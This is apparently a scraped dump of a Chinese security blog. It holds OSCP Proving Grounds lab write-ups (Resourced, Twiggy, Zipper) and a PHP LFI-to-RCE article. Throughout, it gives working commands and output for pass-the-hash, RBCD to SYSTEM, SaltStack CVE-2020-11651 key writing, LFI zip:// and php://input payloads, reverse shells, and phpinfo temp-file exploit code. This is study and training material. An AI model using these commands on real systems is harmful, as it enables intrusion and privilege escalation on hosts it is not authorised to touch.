STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\L.Livingstone:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:3e028552b946cc4f282b72879f63b726 STATUS_PASSWORD_EXPIREDSMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:913c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\J.Johnson:62e16d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:3105e0f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:204410cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:19a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:3e028552b946cc4f282b72879f63b726 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [+] resourced.local\\V.Ventz:913c144caea1c0a936fd1ccb46929d3cSMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURESMB 192.168.197.175 445 RESOURCEDC [-] resourced.local\\V.Ventz:980910b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE... V.Ventz 和 L.Livingston密码可使用, 因为用户名和对应的hash是已知的，理论上不用这样一一尝试 rdp尝试rdesktop 登录提示密码错误 1rdesktop -u L.Livingstone -p 19a3a7550ce8c505c2d46b5e39d6f808 192.168.197.175 -d resourced.local 1xfreerdp /u:L.Livingstone /d:resourced.local /v:192.168.197.175 /pth:19a3a7550ce8c505c2d46b5e39d6f808 不允许不输入密码的情况下登录，无法pth evil-winrm123456789101112evil-winrm -i 192.168.197.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents&gt; cd ..*Evil-WinRM* PS C:\\Users\\L.Livingstone&gt; type desktop/local.txtca5550158d15c6d29ebefd38d5116193 escalationbloodhount此前也尝试了本地bloodhount.py没有成功 123456789bhpy -dns-tcp -ns 192.168.197.175 -d resourced.local -u &#x27;L.Livingstone&#x27; --hashes 19a3a7550ce8c505c2d46b5e39d6f808 -c allINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)Traceback (most recent call last): File &quot;/home/kali/Tools/windows/BloodHound.py/bloodhound.py&quot;, line 5, in &lt;module&gt; bloodhound.main() File &quot;/home/kali/Tools/windows/BloodHound.py/bloodhound/__init__.py&quot;, line 289, in main lm, nt = args.hashes.split(&quot;:&quot;) ^^^^^^ValueError: not enough values to unpack (expected 2, got 1) 通过evil-winrm 下载Sharphound.ps1， 收集信息后下载到本地， evil-WinRM有download命令，可以直接下载。 1234567891011*Evil-WinRM* PS C:\\Users\\L.Livingstone&gt; certutil -urlcache -f http://192.168.45.189/SharpHound.ps1 SharpHound.ps1**** Online ****CertUtil: -URLCache command completed successfully.*Evil-WinRM* PS C:\\Users\\L.Livingstone&gt; Import-Module .\\Sharphound.ps1*Evil-WinRM* PS C:\\Users\\L.Livingstone&gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory ./ -OutputPrefix &quot;audit&quot;*Evil-WinRM* PS C:\\Users\\L.Livingstone&gt; download audit_20250206214256_BloodHound.zipInfo: Downloading C:\\Users\\L.Livingstone\\audit_20250206214256_BloodHound.zip to audit_20250206214256_BloodHound.zipInfo: Download successful! follow the Resource-Based Constrained Delegation: 123456789101112Resource-Based Constrained DelegationFirst, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket&#x27;s addcomputer.py example script:addcomputer.py -method LDAPS -computer-name &#x27;ATTACKERSYSTEM$&#x27; -computer-pass &#x27;Summer2018!&#x27; -dc-host $DomainController -domain-netbios $DOMAIN &#x27;domain/user:password&#x27;We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket&#x27;s rbcd.py script can be used for that purpose:rbcd.py -delegate-from &#x27;ATTACKERSYSTEM$&#x27; -delegate-to &#x27;TargetComputer&#x27; -action &#x27;write&#x27; &#x27;domain/user:password&#x27;And finally we can get a service ticket for the service name (sname) we want to &quot;pretend&quot; to be &quot;admin&quot; for. Impacket&#x27;s getST.py example script can be used for that purpose.getST.py -spn &#x27;cifs/targetcomputer.testlab.local&#x27; -impersonate &#x27;admin&#x27; &#x27;domain/attackersystem$:Summer2018!&#x27;This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.Shadow Credentials attackTo abuse this permission, use pyWhisker.pywhisker.py -d &quot;domain.local&quot; -u &quot;controlledAccount&quot; -p &quot;somepassword&quot; --target &quot;targetAccount&quot; --action &quot;add&quot;For other optional parameters, view the pyWhisker documentation. rbcd: https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py Let’s use our access with the l.livingstone account to create a new machine account on the domain. We can do with by using impacket-addcomputer. 1234567&gt; impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.197.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name &#x27;ATTACK$&#x27; -computer-pass &#x27;AttackerPC1!&#x27;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Successfully added machine account ATTACK$ with password AttackerPC1!. We can verify that this machine account was added to the domain by using our evil-winrm session from before. 123456789101112*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents&gt; get-adcomputer attackDistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=localDNSHostName :Enabled : TrueName : ATTACKObjectClass : computerObjectGUID : 3fe60405-3692-4de9-8a20-917b234741b9SamAccountName : ATTACK$SID : S-1-5-21-537427935-490066102-1511301751-3601UserPrincipalName : With this account added, we now need a python script to help us manage the delegation rights. Let’s grab a copy of rbcd.py and use it to set msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account. 1234567891011121314&gt; wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py &gt; python rdbc.py -dc-ip 192.168.197.175 -t RESOURCEDC -f &#x27;ATTACK&#x27; -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\\\l.livingstoneImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$[*] Initializing LDAP connection to 192.168.197.175[*] Using resourced\\l.livingstone account with password ***[*] LDAP bind OK[*] Initializing domainDumper()[*] Initializing LDAPAttack()[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`[*] Delegation rights modified succesfully![*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy We can confirm that this was successful by using our evil-winrm session. 12345*Evil-WinRM* PS C:\\Users\\L.Livingstone\\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentityPath Owner Access---- ----- ------ BUILTIN\\Administrators resourced\\ATTACK$ Allow We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account. 123456789101112131415161718&gt; impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\\$:&#x27;AttackerPC1!&#x27; -impersonate Administrator -dc-ip 192.168.197.175Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Getting TGT for user[*] Impersonating Administrator/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[*] Requesting S4U2self/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[*] Requesting S4U2Proxy[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache This saved the ticket on our Kali host as Administrator.ccache. We need to export a new environment variable named KRB5CCNAME with the location of this file. 1&gt; export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Now, all we have to do is add a new entry in &#x2F;etc&#x2F;hosts to point resourcedc.resourced.local to the target IP address and run impacket-psexec to drop us into a system shell. 1└─$ sudo sh -c &#x27;echo &quot;192.168.120.181 resourcedc.resourced.local&quot; &gt;&gt; /etc/hosts&#x27; 12345678910111213141516&gt; impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.197.175Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on resourcedc.resourced.local.....[*] Found writable share ADMIN$[*] Uploading file xwXtzaPl.exe[*] Opening SVCManager on resourcedc.resourced.local.....[*] Creating service oEXO on resourcedc.resourced.local.....[*] Starting service oEXO.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.2145](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\system done","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Twiggy","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"信息收集 8000端口信息 exphttps://gist.github.com/momenbasel/b883d039bb28b18ccd7efe92a91d98f8c https://github.com/jasperla/CVE-2020-11651-poc 12345pip3 install saltpython slat_rce.py -m 192.168.156.62 -p 4506 --upload-src /home/kali/.ssh/id_rsa.pub --upload-dest ../../../../root/.ssh/authorized_keyspython slat_rce.py -m 192.168.156.62 -p 4505 -r ../../../../root/.ssh/authorized_keys成功写入ssh root@192.168.156.62 思考80端口有很多信息，其中还有admin后台，不要直接跳入rabbit hole，先收集所有信息，不熟悉的信息及时搜索。","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Zipper","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"DifficultyHard Scan12345678[*] ssh found on tcp/22. OpenSSH 8.2p1[*] http found on tcp/80. Apache/2.4.41 (Ubuntu) Title: Zipperpo Bootstrap[4.0.0] Foothold 查看页面源代码，发现home处的跳转链接是 index.php?file&#x3D;home 可能存在任意文件包含漏洞，访问&#x2F;index.php?file&#x3D;index 服务器返回500,确认存在文件包含，那问题是该怎么上传恶意文件呢？ 尝试1： 上传文件后有下载链接，文件内容中会包含明文的文件名，尝试把文件名改成webshell，上传后，index.php?file&#x3D;uploads&#x2F;upload_xxxx.zip, 失败 尝试2： 远程文件包含，index.php?file&#x3D;http://192.169.45.234:8000/shell.php 失败 尝试3： 猜上传之后的文件名，当然都失败了 查看提示，可以使用wrapper读取源码 http://192.168.212.229/index.php?file=php://filter/convert.base64-encode/resource=home 输出base64编码的源码，解析后看到include了upload.php 继续查看upload文件，会把上传的文件重命名： 时间+随机数.tmp， 看到这第一想法是写个脚本爆破随机数，但是随机数范围太大了（0-4294967295），放弃了这个念头。而实际登录机器之后，发现每分钟会清理.tmp文件。 再次查看hits, 方法是使用zip:&#x2F;&#x2F; warpper 1http://192.168.109.128/index.php?file=zip://uploads/upload_1627661999.zip%23shell msfvenom生成反弹shell php文件，上传后 执行得到shell 12345678rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.229] 33570iduid=33(www-data) gid=33(www-data) groups=33(www-data)python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; Escalation上传linpeas收集信息，发现定时任务 * * * * * root bash /opt/backup.sh 查看脚本所属为root, 没有修改权限，查看内容是把密码备份，查看日志得到密码：WildCardsGoingWild, 验证密码为root密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657www-data@zipper:/var/www/html$ cd /optcd /optwww-data@zipper:/opt$ lslsbackup.sh backupswww-data@zipper:/opt$ ls -alls -altotal 16drwxr-xr-x 3 root root 4096 Aug 12 2021 .drwxr-xr-x 20 root root 4096 Aug 12 2021 ..-rwxr-xr-x 1 root root 153 Aug 12 2021 backup.shdrwxr-xr-x 2 root root 4096 Feb 17 16:56 backupswww-data@zipper:/opt$ cat backup.shcat backup.sh#!/bin/bashpassword=`cat /root/secret`cd /var/www/html/uploadsrm *.tmp7za a /opt/backups/backup.zip -p$password -tzip *.zip &gt; /opt/backups/backup.logwww-data@zipper:/opt/backups$ cat backup.logcat backup.log7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor (A00F11),ASM,AES-NI)Open archive: /opt/backups/backup.zip--Path = /opt/backups/backup.zipType = zipPhysical Size = 15736Scanning the drive:27 files, 12370 bytes (13 KiB)Updating archive: /opt/backups/backup.zipItems to compress: 27Files read from disk: 27Archive size: 15736 bytes (16 KiB)Scan WARNINGS for files and folders:WildCardsGoingWild : No more files----------------Scan WARNINGS: 1www-data@zipper:/opt/backups$ su rootsu rootPassword: WildCardsGoingWildroot@zipper:/opt/backups# ididuid=0(root) gid=0(root) groups=0(root) 密码为什么会被输出到日志文件中？ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html 命令：7za a /opt/backups/backup.zip -p$``password -tzip *.zip &gt; /opt/backups/backup.log 查看&#x2F;www&#x2F;html&#x2F;uploads目录的文件 在使用7z 使用**通配符 *.zip**时，@enox.zip 会被认为是listfile, 其中包含需要被压缩的文件列表（filelist) 在7z执行时，它会把enox.zip视为包含应压缩文件列表的文件，它会将&#x2F;root&#x2F;secret的内容读取出来，但是由于该文件不是文件列表，所以会抛出错误并把内容作为错误信息输出，这儿就是打印到日志里。 看题解中 @enox.zip 和 enox.zip 软链应该是需要手动新建的来利用的，但是已经有了，简化了题目。 pspy另一个方法是使用pspy执行的命令 执行命令是 7za a /opt/backups/backup.zip -p$``password -tzip *.zip &gt; /opt/backups/backup.log 命令中包含读到的密码，密码会被直接输出。 php wrapper参阅： PHP Wrapper 利用 反思要善用搜索，zip文件中的php文件利用搜索能找到结果，不能陷入思维困局。","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"PHP LFI abuse","date":"2025-03-10T18:37:39.000Z","path":"post/20250311023739.html","text":"LFI： Local File Inclusion 文件包含漏洞LFI 常见利用方式利用LFI实现code execution的关键是能够把文件写入服务器上的本地文件中，常见的方法有： 包含上传的文件：这是最直接的方式，利用网站的文件上传功能（例如头像上传），上传包含PHP代码的文件（伪装成图片等），然后通过LFI漏洞包含该文件，难点是需要找到文件保存的位置 php://伪协议：php伪协议是PHP提供的特殊协议, 可阅读这里： PHP Wrapper 利用 php://filter/convert.base64-encode/resource=/etc/passwd常被用来绕过直接文件路径访问的限制 php://input会读取原始POST请求体,在post数据中嵌入php代码， 会将POST数据作为输入流包含，从而实现代码执行，如 123456GET /vuln.php?file=php://input HTTP/1.1Host: example.comContent-Type: application/x-www-form-urlencodedContent-Length: 20&lt;?php system(&#x27;id&#x27;); ?&gt; data://允许以数据流形式提供内容, 如 data://text/plain,&lt;?php system(&#39;id&#39;); ?&gt;&quot;)可以直接在URL中嵌入php代码，一般常用方式还有使用base64编码绕过 file://是默认的文件访问协议, 如 file:///etc/passwd可以读取本地文件，但是无法直接执行代码 excepct://允许执行指定命令，并将输出作为输入流，如 excepect://whoami直接执行系统命令 包含日志文件：如果我们能够读取像httpd service log、ssh log的权限的话，可以通过向其中注入恶意代码的方式来利用，前提是需要有权限，因为日志文件通常在server 根目录外 proc/self/environ：Linux系统中程序运行时环境变量（包括HTTP头），在请求中将php代码放入Header中（如User-Agent), 然后通过LFI包含 proc/self/environ 包含 session file: 通过会话投毒控制会话内容，将php代码注入session文件中，和包含日志文件类似需要知道会话文件位置和名称，并且需要有足够权限 LFI临时文件如果我们无法手动上传文件也无法找到可以利用的文件，还有一种利用方式是利用临时文件包含，达到执行命令的目的。 LFI2RCE via PHPinfo()在2011年INSOMNIASEC公布的Research Paper中，基于Gynvael Coldwind提出的PHP_LFI_rfc1867_temporary_files提出来针对PHPinfo()上传文件的攻击方式：LFI WITH PHPINFO() ASSISTANCE, 在Paper中给出了完整的在linux环境下的利用代码。 利用前提 file_uploads: on（php 4.3起默认开始） phpinfo() accessable LFI Vulnerablity 利用过程：当我们通过POST请求向任意PHP文件上传文件时，PHP都会accept, 并把它存储在一个临时文件夹下，直到当前request完全结束时，会把这个临时文件删除，如果我们可以在请求结束之前获取到文件路径和临时文件名(linux下通常是 /tmp/php[6*random digits]，Windows下一般是 C:\\Windows\\Temp, 具体路径可以在upload_tmp_dir中指定)，那么就可以通过LFI来利用它。 这种方式的挑战在于时间窗口，临时文件在脚本执行结束后会被删除，攻击需要在文件存在期间完成，需要在临时文件被删除之前找到它并成功执行LFI包含。 Windows FindFirstFileGynvael Coldwind使用 FindFirstFile quirk在Windows环境下来找到上传的临时文件，FindFirstFile是Windows API的一个函数，用于查找指定目录中匹配某个pattern的第一个文件，在Windows下，当php执行文件包含操作（include或require）时，底层会调用包括 FindFirstFile在内的Windows的文件系统API来解析和定位目标文件。而文件包含支持通配符： &lt;表示 *（任意字符），&gt;表示 ?（单个字符）, 因此可以直接在上传文件的同时，请求 /lfi.php?inc=C:\\Windows\\Temp\\php&lt;&lt; 匹配并包含临时文件执行代码。 PHPinfo()但是在GNU&#x2F;Linux下没有类似FindFirstFile的特性，很难在时间窗口内遍历所有随机生成的文件名。然而当我们向phpinfo() 上传文件时，Phpinfo会输出上下文中所有变量，在PHP Variables部分可以直接看到所上传临时文件的信息，其中就包含了文件路径和文件名。 PHP使用缓冲区 buffering来提高数据传输效率，默认情况下buffer被启用，大小被设置为4096。当返回数据超出设定的buffer大小时，会采用分块传输Chunk的方式返回部分内容。只要我们能保证phpinfo()返回的数据会远大于这个阈值，就可以增加请求处理的时间，我们在请求内容和请求头中增加大量的垃圾数据，然后使用Scoket控制单次读取的大小，再成功获取到tmpdir和file name之后，立即请求LFI包含临时文件，利用时间差达到远程代码执行的目的。 代码核心部分如下： 1234567891011121314151617181920212223242526272829303132# phpinforeq 为 POST /phpinfo.php?a=xx 用来上传文件，文中是在/tmp/g文件中写入webshell# lfireq 为 GET /lfi.php?file=xx 用来请求临时文件，执行任务代码# offset：临时文件名tmp_name在phpinfo()返回信息的所处chunk的偏移位置，用来定位需要socket.recv多少次可以读到tmp_name# tag: 在文中为： Security Test, 在请求文件包含后用来校验代码有没有被执行成功def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): # 使用原生的socket，控制在读到tmp_name后立即尝试执行文件包含 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) # 上传恶意代码，文中是在/tmp/g文件中写入webshell，读取临时文件路径 s.send(phpinforeq) d = &quot;&quot; # 根据offset读取到包含tmp_name所处位置的数据 while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(&quot;[tmp_name] =&gt; &quot;) # offset实际上也是使用index()获取的基础值+256的padding fn = d[i+17:i+31] # 截取临时文件名 except ValueError: return None # 立即执行文件包含执行恶意代码 s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fn 复现环境搭建 感谢：https://github.com/vulhub/vulhub/tree/master/php/inclusion 克隆项目后 docker compose up -d 启动docker环境 LFI：http://127.0.0.1:8000/lfi.php?file=xxx Phpinfo: http://127.0.0.1:8000/phpinfo.php 执行作者准备好的exp: python2 exp.py 127.0.0.1 8000即可成功上传webshell, exp基本和paper中提供的一样，除了修改了上传文件名和webshell的参数名，作者在README中对漏洞原理介绍也很清晰明了 小插曲执行exp: python2 exp.py 127.0.0.1 8000, 执行了几次后发现无法成功，在lfi.php中增加错误信息输出： 12345&lt;?phpini_set(&#x27;display_errors&#x27;,1);error_reporting(E_ALL);include $_REQUEST[&#x27;file&#x27;];?&gt; 排查过程中发现了另一个问题，在exp.py所在目录下创建test.txt文件 http://127.0.0.1:8000/lfi.php?file=``test.txt可以正常include 但是直接在&#x2F;tmp目录下新建test.txt后 http://127.0.0.1:8000/lfi.php?file=``/tmp/test.txt返回错误： Warning : include(/tmp/test.txt): Failed to open stream: No such file or directory in /var/www/html/lfi.phpon line4 但是&#x2F;tmp&#x2F;test.txt明明存在，后来发现是 PrivateTmp的问题，简单说就是apache2进程是systemd启动的，systemd会因为安全性考虑，在privatetmp&#x3D;true的情况下，不使用公用的&#x2F;tmp目录以及&#x2F;var&#x2F;tmp，进程用于自己的独立的目录以及相应的权限。 12345cat /lib/systemd/system/apache2.service | grep PrivateTmpPrivateTmp=truesystemctl daemon-reloadsudo systemctl restart apache2 最终发现只是因为成功率比较低，失败的话多执行几次就可以了 ：) lif_abuse.py https://github.com/Yiaos/php_lfi_abuse 基于paper中的实现，抄袭众多github lfi相关代码做了一些简单优化： 使用python3 支持-lfi和-phpinfo参数中指定lfi和phpinfo路径 支持windows和linux系统下此方式的利用 -platform可指定平台，同时支持-tmp_dir指定临时目录地址 获取临时文件名从硬编码长度方式改为正则匹配获取以适应不同平台的场景 抄袭lfito_rce、LFI2RCE、lfi2rce支持枚举日志文件、系统文件 使用方式1python lfi_abuse.py &lt;host&gt; &lt;port&gt; -lfi &lt;lfi_path&gt; [options] 利用LFI和phpinfo()写入webshell 1python lfi_abuse.py 127.0.0.1 80 -lfi &quot;/lfi.php?file=&quot; -p &quot;linux&quot; -tmp_dir &quot;/tmp&quot; -phpinfo &quot;/phpinfo.php&quot; 利用LFI枚举信息 1python lfi_abuse.py 127.0.0.1 80 -lfi &quot;/lfi.php?file=&quot; -enum-files -p &quot;linux&quot; 参考 INSOMNIASEC Research Paper: https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf Gynvael Coldwind LFI原文： https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf Github Repositories: https://github.com/vulhub/vulhub/tree/master/php/inclusion https://github.com/roughiz/lfito_rce https://github.com/takabaya-shi/LFI2RCE https://github.com/0bfxgh0st/lfi2rce phpwrap: https://www.angelwhu.com/paper/2016/06/13/phpinfo-lfi-upload-shell/#0x00-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86 https://qkxu.github.io/2022/03/16/systemd%E4%B9%8BPrivateTmp.html https://abdelhameedghazy.medium.com/5-ways-to-chain-lfi-2-rce-with-default-configurations-in-php-4d3b839a4cc3","categories":[{"name":"How It Works-临渊羡鱼","slug":"How-It-Works-临渊羡鱼","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/"},{"name":"PHP","slug":"How-It-Works-临渊羡鱼/PHP","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/PHP/"}],"tags":[]},{"title":"PHP Wrapper 利用","date":"2025-03-10T18:18:11.000Z","path":"post/20250311021811.html","text":"什么是php wrapper?PHP wrapper基于流（stream）的概念，流是数据传输的抽象表示。wrapper定义了如何处理特定协议或资源（如文件、HTTP请求、内存流）的输入输出操作。每个wrapper通过PHP的流函数（如 fopen()、file_get_contents）与底层资源交互，提供统一的借口来操作不同类型的数据源。wrapper除了内置于PHP之外，也可以通过 stream_wrapper_register()自定义。 如以下php代码 123456&lt;?php$handle = fopen(&quot;file://some.txt&quot;,&quot;rb&quot;);while(feof($handle)!==true) &#123;echofgets($handle);&#125;?&gt; 等同于 123&lt;?phpprint_r(file(&quot;file://some.txt&quot;));?&gt; PHP内置Wrapper列表 包装器名称 原理 用途 file:&#x2F;&#x2F; 默认的文件系统包装器，允许访问本地文件系统中的文件和目录。 用于读取或写入本地文件，如配置文件、日志文件等。 http:&#x2F;&#x2F; 通过HTTP协议访问远程服务器上的资源，使用GET方法获取数据。 用于从Web服务器获取文件或数据（如API调用），常用于抓取网页内容。 https:&#x2F;&#x2F; 与http:&#x2F;&#x2F;类似，但通过SSL&#x2F;TLS加密传输数据。 用于安全地访问远程Web资源，常用于处理需要加密的HTTP请求。 ftp:&#x2F;&#x2F; 通过FTP协议访问远程FTP服务器上的文件，支持身份验证。 